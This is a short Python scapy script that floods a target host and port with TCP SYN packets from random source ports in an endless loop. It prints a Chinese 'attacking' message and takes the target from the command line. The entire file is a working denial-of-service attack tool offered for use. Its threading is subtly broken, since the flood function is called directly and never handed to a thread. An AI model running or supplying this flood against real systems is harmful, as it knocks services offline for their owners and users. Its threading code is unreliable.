#!/usr/bin/env python 
# -*- coding:utf-8 -*-

from scapy.all import *
#import scapy.all
from time import sleep
import threading
import random
import sys
#import logging

if len(sys.argv) != 4:
    print("")
    print("")
    sys.exit()

target=str(sys.argv[1])
port=int(sys.argv[2])
threads=int(sys.argv[3])

print("攻击中》》》》》》》》")

def synflood(target,port):
    while True:
        x=random.randint(0,65535)
        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)

for x in range(0,threads):
    th=threading.Thread(synflood(target,port))
    th.start()
    th.join()

while True:
    sleep(1)
